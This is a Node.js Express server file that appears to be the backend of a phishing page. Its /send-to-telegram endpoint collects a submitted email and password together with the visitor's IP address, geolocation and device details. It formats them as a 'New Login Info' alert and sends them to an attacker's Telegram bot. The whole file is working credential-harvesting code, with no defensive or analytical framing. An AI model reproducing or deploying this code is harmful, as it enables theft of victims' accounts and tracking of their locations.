const express = require('express');
const app = express();
const path = require('path');
const bodyParser = require('body-parser');
const axios = require('axios'); // Make sure axios is installed
const UAParser = require('ua-parser-js'); // Import the UAParser library
require('dotenv').config(); // Load environment variables from .env file

// Serve static files (like your HTML, CSS, JS) from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse JSON data
app.use(bodyParser.json());

// Define the root route to serve your index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Retrieve bot token and chat ID from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Endpoint to handle form submission
app.post('/send-to-telegram', (req, res) => {
  const { email, password, userAgent, ipAddress, latitude, longitude } = req.body;

  // Use UAParser to parse the userAgent string
  const parser = new UAParser();
  parser.setUA(userAgent);
  const deviceInfo = parser.getResult();

  // Message format to send to Telegram with emojis
  const message = `
    🔒 *New Login Info* 🔒
    📧 *Email:* ${email}
    🔑 *Password:* ${password}
    
    📍 *Location Details:*
    - 🌍 Latitude: ${latitude}
    - 🌍 Longitude: ${longitude}
    - 🌐 IP Address: ${ipAddress}
    - 💻 Device: ${deviceInfo.device.model || detectDesktopOS(deviceInfo)}
    - 🖥 Device Type: ${detectDeviceType(deviceInfo)}
  `;

  // Send data to Telegram bot
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  })
  .then(() => res.send('Data sent successfully to Telegram.'))
  .catch(err => {
    console.error(err);
    res.status(500).send('Error sending data to Telegram.');
  });
});

// Function to detect device type (Desktop, Mobile, Tablet)
function detectDeviceType(deviceInfo) {
  if (deviceInfo.device.type === "mobile") {
    return "Mobile 📱";
  } else if (deviceInfo.device.type === "tablet") {
    return "Tablet 📝";
  } else {
    return "Desktop 🖥";
  }
}

// Function to detect OS for desktops if model info is missing
function detectDesktopOS(deviceInfo) {
  if (deviceInfo.os.name) {
    return `${deviceInfo.os.name} ${deviceInfo.os.version || ''}`;
  }
  return 'Unknown Desktop';
}

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
